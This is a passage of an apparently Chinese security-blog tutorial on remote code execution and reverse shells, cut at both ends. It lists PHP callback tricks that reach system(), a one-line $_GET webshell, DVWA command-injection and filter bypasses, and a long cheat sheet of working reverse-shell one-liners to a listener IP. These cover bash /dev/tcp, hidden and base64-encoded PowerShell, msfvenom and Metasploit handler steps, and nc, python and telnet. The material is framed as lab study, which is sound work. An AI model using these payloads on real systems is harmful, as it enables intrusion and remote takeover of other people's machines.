important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="creat-function"><a href="#creat-function" class="headerlink" title="creat_function()"></a>creat_function()</h5><p>create_function — 创建一个匿名函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$newfunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return system($a);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$newfunc</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h5><p>array_map — 为数组的每个元素应用回调函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ipconfig'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h5><p>call_user_func — 把第一个参数作为回调函数调用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h5><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h5><p>array_filter — 使用回调函数过滤数组的元素</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h5><p>uasort — 使用用户自定义的比较函数，保持索引和值的对应关系，原地排序 array。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"system('whoami')"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>url连接： ?a=eval($_GET[cmd])&amp;cmd=system(whoami);</p><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境：DVWA靶场 <strong>Linux</strong></p><p>关卡：Command Injection（low）</p><p>正常功能：检测目标ip是否连通</p><p><img src="/2023/012220963/108.PNG" alt="108"></p><p>构造多条执行的命令： 127.0.0.1 &amp; whoami</p><p>代码审计之后可知实际执行的命令为：</p><pre class="line-numbers language-pphp" data-language="pphp"><code class="language-pphp">ping 127.0.0.1 &amp; whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>在windows操作系统中，使用&amp;符号可以执行多条命令</strong></p><h4 id="过滤分割符"><a href="#过滤分割符" class="headerlink" title="过滤分割符"></a>过滤分割符</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">;</span> <span class="token comment">//两条命令都执行,windows不支持</span><span class="token operator">|</span> <span class="token comment">// 管道</span><span class="token operator">||</span> <span class="token comment">//上一条命令执行失败后，才执行下一条命令</span><span class="token operator">&amp;</span> <span class="token comment">//先执行command2后执行command1</span><span class="token operator">&amp;&amp;</span> <span class="token comment">//先执行command1后执行command2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h3><h4 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h4><p>环境：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">docker pull tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>simple01docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>simple01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>验证输入的内容是不是正确的ip格式</p><p>禁用前端js即可绕过</p><h4 id="空格绕过-1"><a href="#空格绕过-1" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>环境：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">docker pull tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>sapce01docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>sapce01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用以下字符可以绕过空格</p><ul><li><p>tab（%09）</p></li><li><p>space(%20)</p></li><li><p>$IFS$9</p></li><li><p>${IFS}</p></li><li><p>$IFS</p></li></ul><h3 id="反弹shell介绍"><a href="#反弹shell介绍" class="headerlink" title="反弹shell介绍"></a>反弹shell介绍</h3><h4 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h4><p>正向连接：客户端请求服务器，服务器给我们响应</p><p>反向连接（反弹）：目标机器发送请求链接我们的服务器。</p><h4 id="反弹shell基本操作"><a href="#反弹shell基本操作" class="headerlink" title="反弹shell基本操作"></a>反弹shell基本操作</h4><p>反弹shell命令生成网站：<a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p>设置监听者的ip和端口</p><p>开启监听：</p><p>执行反弹命令:</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="CVE-2018-8174"><a href="#CVE-2018-8174" class="headerlink" title="CVE-2018-8174"></a><strong>CVE-2018-8174</strong></h4><h2 id="RCE-反弹shell详解"><a href="#RCE-反弹shell详解" class="headerlink" title="RCE-反弹shell详解"></a>RCE-反弹shell详解</h2><h3 id="重难点"><a href="#重难点" class="headerlink" title="重难点"></a>重难点</h3><ul><li><p>Linux Bash方式反弹</p></li><li><p>Windows Powershell反弹</p></li><li><p>Windows Metaspolit反弹</p></li></ul><h3 id="Shell基础概念"><a href="#Shell基础概念" class="headerlink" title="Shell基础概念"></a>Shell基础概念</h3><h4 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h4><p>Shell中文意思为壳，Shell 是指一种应用程序，用户通过这个应用程序访问操作系统内核的服务。</p><p>Linux内核（Kernel）具有管理计算机硬件的一些功能，如进程管理、内存管理等，内核识别计算机语言，因此需要一个程序帮助 “翻译” 人类语言为计算机语言。这个程序就是Shell。shell不特指某一个程序，能提供计算机交互的程序都叫做shell。</p><h4 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h4><p>是一种为 shell 编写的脚本程序，本质上是脚本文件。</p><h4 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h4><p>指开发shell脚本，并不是指开发shell程序</p><h4 id="bash和sh"><a href="#bash和sh" class="headerlink" title="bash和sh"></a>bash和sh</h4><p>bash和sh是Linux中经常使用的shell</p><p>Linux 的 Shell脚本解释器种类众多，常见的有：</p><ul><li><p>Bourne Shell（/usr/bin/sh或/bin/sh）</p></li><li><p>Bourne Again Shell（/bin/bash）</p></li><li><p>C Shell（/usr/bin/csh）</p></li><li><p>K Shell（/usr/bin/ksh）</p></li><li><p>Z shell（/usr/bin/zsh）</p></li><li><p>Shell for Root（/sbin/sh）</p></li></ul><h3 id="反弹-反向连接"><a href="#反弹-反向连接" class="headerlink" title="反弹/反向连接"></a>反弹/反向连接</h3><p>反弹指的是，目标机器发送请求链接我们的服务器。</p><p><img src="/2023/012220963/109.PNG" alt="109"></p><p>什么情况下需要反弹？</p><ul><li><p>一般防火墙会拦截对内部的请求，但是对向外部的访问不做限制。</p></li><li><p>目标主机在内网，我们不能直接链接，但是目标可以出网</p></li></ul><h4 id="netcat瑞士军刀"><a href="#netcat瑞士军刀" class="headerlink" title="netcat瑞士军刀"></a>netcat瑞士军刀</h4><p>NetCat，在网络工具中有“瑞士军刀”美誉，其有Windows和Linux的版本。因为它短小精悍（1.84版本也不过25k，旧版本或缩减版甚至更小）、功能实用。</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ul><li><p>Kali：自带</p></li><li><p>CentOS：yum install nc</p></li><li><p>Windows：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p></li></ul><p>注：Windows中运行nc会被杀毒软件拦截，需要添加信任</p><h5 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># nc -lvvp/lvnp port</span><span class="token function">nc</span> -lvvp <span class="token number">9999</span> <span class="token comment"># vv为显示更详细的信息</span><span class="token function">nc</span> -lvnp <span class="token number">9999</span> <span class="token comment"># n为使用数值ip，不适用DNS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="linux反弹shell"><a href="#linux反弹shell" class="headerlink" title="linux反弹shell"></a>linux反弹shell</h3><h4 id="sh-bash"><a href="#sh-bash" class="headerlink" title="sh/bash"></a>sh/bash</h4><h5 id="Bash-i"><a href="#Bash-i" class="headerlink" title="Bash -i"></a>Bash -i</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sh</span> -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.61.1/9999 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token function">bash</span> -c <span class="token string">"sh -i >&amp; /dev/tcp/192.168.61.1/9999 0>&amp;1"</span>//备用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/110.PNG" alt="110"></p><h5 id="Bash-read-line"><a href="#Bash-read-line" class="headerlink" title="Bash read line"></a>Bash read line</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">5</span>&lt;></span>/dev/tcp/192.168.61.1/9999<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;5</span><span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/113.PNG" alt="113"></p><h5 id="Bash5"><a href="#Bash5" class="headerlink" title="Bash5"></a>Bash5</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">bash</span> -c <span class="token string">"sh -i 5&lt;> /dev/tcp/192.168.61.1/9999 0&lt;&amp;5 1>&amp;5 2>&amp;5"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/111.PNG" alt="111"></p><h5 id="Bash196"><a href="#Bash196" class="headerlink" title="Bash196"></a>Bash196</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator"><span class="token file-descriptor important">0</span>&lt;&amp;</span><span class="token number">196</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> <span class="token number">19</span><span class="token operator"><span class="token file-descriptor important">6</span>&lt;></span>/dev/tcp/192.168.61.1/9999<span class="token punctuation">;</span> <span class="token function">sh</span> <span class="token operator">&lt;&amp;</span><span class="token number">196</span> <span class="token operator">>&amp;</span><span class="token number">196</span> <span class="token operator"><span class="token file-descriptor important">2</span>>&amp;</span><span class="token number">196</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/112.PNG" alt="112"></p><h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">//本机环境一塌糊涂shift+鼠标右键//可以打开powershell窗口，可运行脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="Powershell1"><a href="#Powershell1" class="headerlink" title="Powershell1"></a>Powershell1</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -nop -c <span class="token string">"<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('192.168.111.136',9999);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535|%&#123;0&#125;;while<span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0)&#123;;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2>&amp;1 | Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '> ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()&#125;;<span class="token variable">$client</span>.Close()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="Powershell2"><a href="#Powershell2" class="headerlink" title="Powershell2"></a>Powershell2</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -nop -W hidden -noni -ep bypass -c <span class="token string">"<span class="token variable">$TCPClient</span> = New-Object Net.Sockets.TCPClient('192.168.61.1', 9999);<span class="token variable">$NetworkStream</span> = <span class="token variable">$TCPClient</span>.GetStream();<span class="token variable">$StreamWriter</span> = New-Object IO.StreamWriter(<span class="token variable">$NetworkStream</span>);function WriteToStream (<span class="token variable">$String</span>) &#123;[byte[]]<span class="token variable">$script</span>:Buffer = 0..<span class="token variable">$TCPClient</span>.ReceiveBufferSize | % &#123;0&#125;;<span class="token variable">$StreamWriter</span>.Write(<span class="token variable">$String</span> + 'SHELL> ');<span class="token variable">$StreamWriter</span>.Flush()&#125;WriteToStream '';while<span class="token variable"><span class="token punctuation">((</span>$BytesRead <span class="token operator">=</span> $NetworkStream.Read<span class="token punctuation">(</span>$Buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $Buffer.Length<span class="token punctuation">))</span></span> -gt 0) &#123;<span class="token variable">$Command</span> = ([text.encoding]::UTF8).GetString(<span class="token variable">$Buffer</span>, 0, <span class="token variable">$BytesRead</span> - 1);<span class="token variable">$Output</span> = try &#123;Invoke-Expression <span class="token variable">$Command</span> 2>&amp;1 | Out-String&#125; catch &#123;<span class="token variable">$_</span> | OutString&#125;WriteToStream (<span class="token variable">$Output</span>)&#125;<span class="token variable">$StreamWriter</span>.Close()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Powershell-Base64"><a href="#Powershell-Base64" class="headerlink" title="Powershell Base64"></a>Powershell Base64</h5><p><strong>shell自动生成地址：</strong></p><p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p>将Powershell1中，-c后面的内容，即双引号中的内容使用base64编码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQAxAC4AMQAzADYAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/114.PNG" alt="114"></p><p><img src="/2023/012220963/115.PNG" alt="115"></p><h4 id="Metaspolit"><a href="#Metaspolit" class="headerlink" title="Metaspolit"></a>Metaspolit</h4><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，旨在方便渗透测试，他是有Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。几乎所有流行的操作系统都支持Metasploit框架而且Metasploit框架在这些操作系统上的工作流程基本都一样。</p><p><strong>反弹三部曲：</strong></p><ol><li>生成木马</li><li>加载监听</li><li>执行木马</li></ol><h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9999</span> -f exe -o reverse.exemsfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9999</span> -f exe -o reverse.exemsfvenom -p windows/x64/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9999</span> -f exe -o reverse.exemsfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9999</span> -f exe -o reverse.exemsfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9999</span> -f exe -o reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="加载监听"><a href="#加载监听" class="headerlink" title="加载监听"></a>加载监听</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsolemsf5 <span class="token operator">></span> use exploit/multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> PAYLOAD payloadmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST localhostmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT portmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="执行木马"><a href="#执行木马" class="headerlink" title="执行木马"></a>执行木马</h5><p><strong>执行命令时，如果出现中文乱码，使用chcp切换编码即可</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chcp <span class="token number">65001</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监听显示器</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter <span class="token operator">></span> run vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="其他应用反弹shell"><a href="#其他应用反弹shell" class="headerlink" title="其他应用反弹shell"></a>其他应用反弹shell</h3><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -c <span class="token function">sh</span> <span class="token number">192.168</span>.0.106 <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">export</span> <span class="token assign-left variable">RHOST</span><span class="token operator">=</span><span class="token string">"192.168.0.106"</span><span class="token punctuation">;</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">RPORT</span><span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">;</span>python -c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</span>python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">export</span> <span class="token assign-left variable">RHOST</span><span class="token operator">=</span><span class="token string">"192.168.0.106"</span><span class="token punctuation">;</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">RPORT</span><span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">;</span>python3 -c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</span>python3 -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span>python3 -c <span class="token string">'import os,pty,socket;s=socket.socket();s.connect(("192.168.0.106",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp -u<span class="token variable">)</span></span><span class="token punctuation">;</span><span class="token function">mkfifo</span> <span class="token variable">$TF</span> <span class="token operator">&amp;&amp;</span> telnet <span class="token number">192.168</span>.0.106 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token variable">$TF</span> <span class="token operator">|</span> <span class="token function">sh</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token variable">$TF</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="zsh"><a href="#zsh" class="headerlink" 